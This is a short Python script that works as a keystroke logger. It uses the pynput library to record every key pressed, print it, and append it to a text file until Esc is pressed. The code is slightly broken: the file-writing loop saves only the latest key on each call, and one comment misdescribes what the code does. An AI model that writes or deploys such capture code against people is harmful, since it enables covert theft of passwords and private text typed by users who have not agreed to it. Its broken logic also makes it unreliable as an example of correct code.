from pynput.keyboard import Key, Listener  #install pynput first

k =[] #empty list to hold data from the keys pressed

def on_press(key):
    k.append(key)
    write_1(k)
    print(key)

def write_1(var):
    with open("demo.txt","a") as f:
        for i in var:
         new_var = str(i).replace("'",'')# replacing space by ''
        f.write(new_var)
        f.write(" ")

def on_release(key):
    if key == Key.esc:
        return False #stop listener


with Listener(on_press=on_press,on_release=on_release) as l:
      l.join()
